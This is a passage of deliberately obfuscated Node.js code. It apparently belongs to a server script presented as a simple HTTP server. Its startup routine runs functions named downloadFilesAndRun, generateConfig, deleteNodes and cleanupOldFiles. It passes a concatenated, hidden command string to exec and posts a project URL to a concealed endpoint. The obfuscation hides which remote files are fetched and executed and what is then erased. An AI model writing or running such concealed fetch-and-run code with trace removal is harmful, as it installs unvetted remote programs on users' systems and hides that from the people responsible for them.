_0x4f9742=_0x5a3deb;console[_0x4f9742(0x163)](),console[_0x4f9742(0x117)](_0x4f9742(0x184)),console[_0x4f9742(0x117)](_0x4f9742(0x187));}):exec(_0x5a3deb(0x158)+_0x59f62f[_0x5a3deb(0x16a)]('\x20')+_0x5a3deb(0x12f),_0x2b1e36=>{const _0x1f10a4=_0x5a3deb;console[_0x1f10a4(0x163)](),console[_0x1f10a4(0x117)](_0x1f10a4(0x184)),console[_0x1f10a4(0x117)](_0x1f10a4(0x187));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xa82456=_0x52af72;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x449686=await axios[_0xa82456(0x146)](_0xa82456(0xeb),{'url':PROJECT_URL},{'headers':{'Content-Type':_0xa82456(0x122)}});return console[_0xa82456(0x117)](_0xa82456(0xee)),_0x449686;}catch(_0xb7c59a){return console[_0xa82456(0x10c)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0xb7c59a[_0xa82456(0x116)]),null;}}async function startserver(){const _0x1198da=_0x52af72;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2b7241){console[_0x1198da(0x10c)](_0x1198da(0x17c),_0x2b7241);}}startserver()[_0x52af72(0x13e)](_0x5e0e8f=>{const _0x43d64d=_0x52af72;console[_0x43d64d(0x10c)](_0x43d64d(0xf1),_0x5e0e8f);}),app[_0x52af72(0x123)](PORT,()=>console[_0x52af72(0x117)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
